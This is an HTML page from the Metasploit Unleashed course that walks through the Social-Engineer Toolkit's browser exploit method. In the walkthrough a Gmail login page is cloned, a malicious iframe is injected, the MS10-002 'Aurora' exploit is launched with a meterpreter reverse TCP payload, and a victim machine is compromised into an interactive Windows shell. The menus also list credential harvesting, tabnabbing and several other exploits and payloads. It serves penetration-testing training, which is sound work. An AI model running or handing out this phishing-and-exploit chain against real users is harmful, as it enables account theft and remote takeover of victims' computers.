<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Metasploit Browser Attack Method</title>
<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Metasploit
Browser Attack Method</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">The Metasploit Browser Exploit Method
will import Metasploit
client-side exploits with the ability to clone a website and use
browser-based exploits. Let&#8217;s take a quick look at executing a browser
exploit through SET.
<br>
<br>
</p>
<pre id="code">Select from the menu:<br><br>1.  Spear-Phishing Attack Vectors<br>2.  Website Attack Vectors<br>3.  Infectious Media Generator<br>4.  Create a Payload and Listener<br>5.  Mass Mailer Attack<br>6.  Teensy USB HID Attack Vector<br>7.  SMS Spoofing Attack Vector<br>8   Update the Metasploit Framework<br>9.  Update the Social-Engineer Toolkit<br>10. Help, Credits, and About<br>11. Exit the Social-Engineer Toolkit<br><br>Enter your choice: 2<br><br>The Social-Engineer Toolkit "Web Attack" vector is a unique way of<br>utilizing multiple web-based attacks in order to compromise the<br>intended victim.<br><br>Enter what type of attack you would like to utilize.<br><br>The Java Applet attack will spoof a Java Certificate and<br>deliver a metasploit based payload. Uses a customized<br>java applet created by Thomas Werth to deliver<br>the payload.<br><br>The Metasploit browser exploit method will utilize select<br>Metasploit browser exploits through an iframe and deliver<br>a Metasploit payload.<br><br>The Credential Harvester Method will utilize web cloning<br>of a website that has a username and password field and<br>harvest all the information posted to the website.<br><br>The TabNabbing Method will wait for a user to move to a<br>different tab, then refresh the page to something different.<br><br>The Man Left in the Middle Attack Method was introduced by<br>Kos and utilizes HTTP REFERER's in order to intercept fields<br>and harvest data from them. You need to have an already vulnerable<br>site and incorporate script src="http://YOURIP/". This could either<br>be from a compromised site or through XSS.<br><br>The web jacking attack method was introduced by white_sheep, Emgent<br>and the Back|Track team. This method utilizes iframe replacements to<br>make the highlighted URL link to appear legitimate however when clicked<br>a window pops up then is replaced with the malicious link. You can edit<br>the link replacement settings in the set_config if its to slow/fast.<br><br>The multi-attack will add a combination of attacks through the web attack<br>menu. For example you can utilize the Java Applet, Metasploit Browser,<br>Credential Harvester/Tabnabbing, and the Man Left in the Middle attack<br>all at once to see which is successful.<br><br>1. The Java Applet Attack Method<br>2. The Metasploit Browser Exploit Method<br>3. Credential Harvester Attack Method<br>4. Tabnabbing Attack Method<br>5. Man Left in the Middle Attack Method<br>6. Web Jacking Attack Method<br>7. Multi-Attack Web Method<br>8. Return to the previous menu<br><br>Enter your choice (press enter for default): 2<br><br><br>The first method will allow SET to import a list of pre-defined<br>web applications that it can utilize within the attack.<br><br>The second method will completely clone a website of your choosing<br>and allow you to utilize the attack vectors within the completely<br>same web application you were attempting to clone.<br><br>The third method allows you to import your own website, note that you<br>should only have an index.html when using the import website<br>functionality.<br><br>[!] Website Attack Vectors [!]<br><br>1. Web Templates<br>2. Site Cloner<br>3. Custom Import<br>4. Return to main menu<br><br>Enter number (1-4): 2<br><br>SET supports both HTTP and HTTPS<br>Example: http://www.thisisafakesite.com<br>Enter the url to clone: https://gmail.com<br><br>Enter the browser exploit you would like to use<br><br>1.  Internet Explorer CSS Tags Memory Corruption<br>2.  Sun Java Runtime New Plugin docbase Buffer Overflow<br>3.  Microsoft Windows WebDAV Application DLL Hijacker<br>4.  Adobe Shockwave rcsL Memory Corruption Exploit<br>5.  Adobe CoolType SING Table "uniqueName" Stack Buffer Overflow<br>6.  Apple QuickTime 7.6.7 _Marshaled_pUnk Code Execution<br>7.  Microsoft Help Center XSS and Command Execution (MS10-042)<br>8.  Microsoft Internet Explorer iepeers.dll Use After Free (MS10-018)<br>9.  Microsoft Internet Explorer Tabular Data Control Exploit (MS10-018)<br>10.  Microsoft Internet Explorer "Aurora" Memory Corruption (MS10-002)<br>11. Microsoft Internet Explorer 7 Uninitialized Memory Corruption (MS09-002)<br>12. Microsoft Internet Explorer Style getElementsbyTagName Corruption (MS09-072)<br>13. Microsoft Internet Explorer isComponentInstalled Overflow<br>14. Microsoft Internet Explorer Explorer Data Binding Corruption (MS08-078)<br>15. Microsoft Internet Explorer Unsafe Scripting Misconfiguration<br>16. FireFox 3.5 escape Return Value Memory Corruption<br>17. Metasploit Browser Autopwn (USE AT OWN RISK!)<br><br>Enter your choice (1-12) (enter for default): 7<br>What payload do you want to generate:<br><br>Name:                                      Description:<br><br>1. Windows Shell Reverse_TCP               Spawn a command shell on victim and send back to attacker.<br>2. Windows Reverse_TCP Meterpreter         Spawn a meterpreter shell on victim and send back to attacker.<br>3. Windows Reverse_TCP VNC DLL             Spawn a VNC server on victim and send back to attacker.<br>4. Windows Bind Shell                      Execute payload and create an accepting port on remote system.<br>5. Windows Bind Shell X64                  Windows x64 Command Shell, Bind TCP Inline<br>6. Windows Shell Reverse_TCP X64           Windows X64 Command Shell, Reverse TCP Inline<br>7. Windows Meterpreter Reverse_TCP X64     Connect back to the attacker (Windows x64), Meterpreter<br>8. Windows Meterpreter Egress Buster       Spawn a meterpreter shell and find a port home via multiple ports<br>9. Download/Run your Own Executable        Downloads an executable and runs it<br><br>Enter choice (example 1-8) (Enter for default):<br>Enter the port to use for the reverse (enter for default):<br><br>[*] Cloning the website: https://gmail.com<br>[*] This could take a little bit...<br>[*] Injecting iframes into cloned website for MSF Attack....<br>[*] Malicious iframe injection successful...crafting payload.<br><br><br>***************************************************<br>Web Server Launched. Welcome to the SET Web Attack.<br>***************************************************<br><br>[--] Tested on IE6, IE7, IE8, Safari, Chrome, and FireFox [--]<br><br>[*] Launching MSF Listener...<br>[*] This may take a few to load MSF...<br>[-] ***<br>[-] * WARNING: No database support: String User Disabled Database Support<br>[-] ***<br><br>                ##                          ###           ##    ##<br> ##  ##  #### ###### ####  #####   #####    ##    ####        ######<br>####### ##  ##  ##  ##         ## ##  ##    ##   ##  ##   ###   ##<br>####### ######  ##  #####   ####  ##  ##    ##   ##  ##   ##    ##<br>## # ##     ##  ##  ##  ## ##      #####    ##   ##  ##   ##    ##<br>##   ##  #### ###   #####   #####     ##   ####   ####   #### ###<br>                                      ##<br><br><br>       =[ metasploit v3.4.2-dev [core:3.4 api:1.0]<br>+ -- --=[ 588 exploits - 300 auxiliary<br>+ -- --=[ 224 payloads - 27 encoders - 8 nops<br>       =[ svn r10268 updated today (2010.09.09)<br><br>resource (src/program_junk/meta_config)&gt; use windows/browser/ms10_002_aurora<br>resource (src/program_junk/meta_config)&gt; set PAYLOAD windows/meterpreter/reverse_tcp<br>PAYLOAD =&gt; windows/meterpreter/reverse_tcp<br>resource (src/program_junk/meta_config)&gt; set LHOST 172.16.32.129<br>LHOST =&gt; 172.16.32.129<br>resource (src/program_junk/meta_config)&gt; set LPORT 443<br>LPORT =&gt; 443<br>resource (src/program_junk/meta_config)&gt; set URIPATH /<br>URIPATH =&gt; /<br>resource (src/program_junk/meta_config)&gt; set SRVPORT 8080<br>SRVPORT =&gt; 8080<br>resource (src/program_junk/meta_config)&gt; set ExitOnSession false<br>ExitOnSession =&gt; false<br>resource (src/program_junk/meta_config)&gt; exploit -j<br>[*] Exploit running as background job.<br>msf exploit(ms10_002_aurora) &gt;<br>[*] Started reverse handler on 172.16.32.129:443<br>[*] Using URL: http://0.0.0.0:8080/<br>[*]  Local IP: http://172.16.32.129:8080/<br>[*] Server started.</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Once the victim browses to our
malicious website, it will look exactly like the site you cloned and
then compromise the system.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">[*] Sending stage (748544 bytes) to 172.16.32.131<br>[*] Meterpreter session 1 opened (172.16.32.129:443 -&gt; 172.16.32.131:1183) at Thu Sep 09 10:14:22 -0400 2010<br><br>msf exploit(handler) &gt; sessions -i 1<br>[*] Starting interaction with 1...<br><br><u>meterpreter</u> &gt; shell<br>Process 2988 created.<br>Channel 1 created.<br>Microsoft Windows XP [Version 5.1.2600]<br>(C) Copyright 1985-2001 Microsoft Corp.<br><br>C:\Documents and Settings\Administrator\Desktop&gt;</pre>
<br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/SET"
 title="SET">SET</a></div>
</body>
</html>
